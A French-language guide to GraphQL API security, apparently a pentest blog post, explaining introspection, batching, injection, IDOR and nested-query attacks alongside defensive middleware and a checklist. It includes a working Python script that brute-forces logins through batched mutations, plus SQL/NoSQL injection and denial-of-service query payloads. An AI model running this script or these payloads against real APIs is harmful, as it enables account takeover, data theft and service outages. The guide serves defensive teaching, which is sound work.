# Sécurité des APIs GraphQL : vulnérabilités et protections

GraphQL offre une flexibilité remarquable aux développeurs, mais cette même flexibilité crée des vecteurs d'attaque uniques. Ce guide couvre les vulnérabilités spécifiques à GraphQL et comment les corriger.

## GraphQL vs REST : différences de sécurité

```
REST :
GET /users/123          → Données d'un utilisateur
GET /users             → Liste des utilisateurs
POST /users            → Créer un utilisateur
→ Endpoints fixes, facile à sécuriser

GraphQL :
POST /graphql avec query personnalisée
→ Un seul endpoint
→ Le client choisit exactement ce qu'il veut
→ Surface d'attaque plus complexe
```

## Introspection — Cartographier l'API

```graphql
# L'introspection révèle toute la structure de l'API
# Souvent activée en production !

{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# Résultat : toutes les types, queries, mutations, subscriptions !
# Un attaquant peut découvrir des endpoints cachés non documentés

# Outil : GraphQL Voyager (visualisation), InQL (Burp extension)
```

## Batching Attacks — Brute Force via GraphQL

```python
# GraphQL permet d'envoyer plusieurs queries en un seul appel
# → Contourne le rate limiting basé sur les requêtes

# Brute force de login via batching
import requests, json

def graphql_batch_bruteforce(url, username, passwords):
    queries = []
    for i, password in enumerate(passwords):
        queries.append({
            "query": f"""
                mutation login{i} {{
                    login(username: "{username}", password: "{password}") {{
                        token
                        success
                    }}
                }}
            """
        })

    # Une seule requête HTTP = des centaines de tentatives
    response = requests.post(url, json=queries)
    results = response.json()

    for i, result in enumerate(results):
        if result.get('data', {}).get(f'login{i}', {}).get('success'):
            return passwords[i]  # Mot de passe trouvé !

    return None
```

## Injection dans les arguments GraphQL

```graphql
# GraphQL Injection - si les arguments ne sont pas validés

# Injection dans un champ de recherche
{
  searchUsers(name: "admin\" OR \"1\"=\"1") {
    id
    email
    password
  }
}

# NoSQL Injection dans les arguments (MongoDB backend)
{
  user(id: {$gt: ""}) {
    id
    username
    password
  }
}
# Si mal géré → retourne TOUS les utilisateurs !
```

## IDOR dans GraphQL

```graphql
# Accéder aux données d'autres utilisateurs

# Requête légitime : voir SON profil
{
  user(id: "current_user_id") {
    name
    email
    creditCards {
      number
      cvv
    }
  }
}

# IDOR : voir le profil d'un autre utilisateur
{
  user(id: "another_user_id") {
    name
    email
    creditCards {
      number  # Données bancaires d'un autre !
      cvv
    }
  }
}
```

## Déni de service par requêtes imbriquées

```graphql
# GraphQL permet des requêtes infiniment imbriquées
# Sans limite → épuisement des ressources serveur

# Attaque par profondeur excessive
{
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                # ... 100 niveaux d'imbrication
                name
              }
            }
          }
        }
      }
    }
  }
}
# Génère une requête SQL avec 100 jointures = crash du serveur !
```

## Protections GraphQL

```python
# 1. Désactiver l'introspection en production
from graphene import Schema

schema = Schema(query=Query, mutation=Mutation)
# Dans le middleware :
def introspection_middleware(next, root, info, **args):
    if info.field_name.startswith('__'):
        if not info.context.user.is_staff:  # Seulement pour les admins
            raise Exception('Introspection désactivée en production')
    return next(root, info, **args)

# 2. Limiter la profondeur des requêtes
from graphql_depth_limit import depth_limit_middleware

app = Flask(__name__)
schema = Schema(query=Query)

@app.route('/graphql', methods=['POST'])
def graphql_view():
    data = request.json
    result = schema.execute(
        data['query'],
        middleware=[depth_limit_middleware(max_depth=5)]  # Max 5 niveaux
    )
    return jsonify(result.data)

# 3. Rate limiting par complexité
# Chaque champ a un "coût" calculé
# Une requête trop complexe est rejetée

# 4. Validation des inputs
import re

def validate_graphql_input(value):
    # Rejeter les caractères suspects
    if re.search(r'["\$\{\}]', str(value)):
        raise ValueError(f"Caractères non autorisés dans l'input: {value}")
    return value

# 5. Authorization à chaque resolver
def resolve_user(root, info, id):
    # Vérifier que l'utilisateur connecté peut accéder à cet ID
    current_user = info.context.user
    if str(current_user.id) != str(id) and not current_user.is_admin:
        raise Exception("Non autorisé")
    return User.query.get(id)
```

## Checklist sécurité GraphQL

```
✅ Introspection désactivée en production
✅ Limitation de la profondeur des requêtes (max 5-10)
✅ Rate limiting par complexité de requête
✅ Authorization vérifiée dans CHAQUE resolver
✅ Validation stricte de tous les inputs
✅ Pagination obligatoire (pas de "retourner tous les records")
✅ Journalisation de toutes les requêtes
✅ Timeout sur les requêtes longues
✅ CORS correctement configuré
✅ Pas de données sensibles dans les messages d'erreur
```

## Conclusion

GraphQL est un paradigme puissant mais qui nécessite une attention sécurité spécifique. Les attaques par introspection, batching et requêtes imbriquées sont des risques uniques à GraphQL. La défense efficace combine : désactivation de l'introspection en prod, limitation de la complexité, autorisation granulaire et validation stricte des inputs.

---
*Catégorie : Pentest*
